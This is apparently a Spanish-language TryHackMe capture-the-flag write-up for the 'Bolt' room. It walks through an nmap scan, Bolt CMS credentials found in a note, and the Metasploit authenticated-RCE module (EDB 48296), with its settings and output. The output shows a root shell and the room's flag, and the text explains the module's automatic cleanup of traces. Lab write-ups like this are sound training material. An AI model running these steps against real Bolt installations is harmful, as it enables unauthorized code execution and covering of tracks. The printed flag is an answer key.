---
title: "TryHackMe: Bolt"
category: "TryHackMe"
order: 24
tags: ["tryhackme", "cms", "bolt-cms", "metasploit", "authenticated-rce"]
layout: layouts/writeup.njk
permalink: /writeups/thm-bolt.html
---

## Reconocimiento

```bash
nmap -p- -Pn -vv -T4 -A 10.10.72.205
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp   open  http    Apache httpd 2.4.29 (Ubuntu)
8000/tcp open  http    PHP 7.2.32-1
```

El puerto **8000** corre un CMS identificado por sus headers y título de página como **Bolt** (`X-Powered-By: PHP`, `<meta name="generator" content="Bolt">`).

## Enumeración de credenciales

- **Usuario en el CMS:** `bolt` (aparece repetidamente en la interfaz).
- Revisando el CMS se encuentra una nota con la contraseña: **`boltadmin123`**.
- **Versión del CMS:** `Bolt 3.7.1` (visible en el panel tras iniciar sesión).

## Identificando el exploit

```bash
searchsploit bolt
```

**EDB-ID:** `48296` — RCE autenticado en Bolt CMS 3.7.0.

```bash
msf6 > search 48296
0  exploit/unix/webapp/bolt_authenticated_rce  2020-05-07  great  Yes
```

## Explotación

```bash
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set lhost 10.8.66.213
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set rhosts 10.10.72.205
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set username bolt
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set password boltadmin123
msf6 exploit(unix/webapp/bolt_authenticated_rce) > run

[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "twpv".
[*] Found 2 potential token(s) for creating .php files.
[+] Used token ... to create hyarkqyomgnz.php.
[*] Command shell session 2 opened
```

El módulo abusa del campo de perfil de usuario de Bolt para inyectar una variable PHP `$_GET`, sube un archivo `.php` temporal usando un token CSRF válido, lo ejecuta, y limpia rastros (borra el archivo y revierte el perfil).

```bash
whoami
root
cd /home
ls
bolt  composer-setup.php  flag.txt
cat flag.txt
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
```

**Flag:** `THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}`

## Lecciones aprendidas

- Un CMS menos conocido (Bolt) sigue el mismo patrón de riesgo que WordPress/Joomla: credenciales débiles/expuestas + versión desactualizada = RCE autenticado directo.
- Revisar el contenido propio del CMS (notas, páginas, comentarios) es una fuente de credenciales tan válida como la fuerza bruta — en este caso la contraseña estaba dejada ahí a propósito.
- Los módulos de Metasploit para RCE autenticado suelen incluir limpieza automática (borrado de archivos temporales, reversión de cambios) para minimizar el rastro dejado en el objetivo.
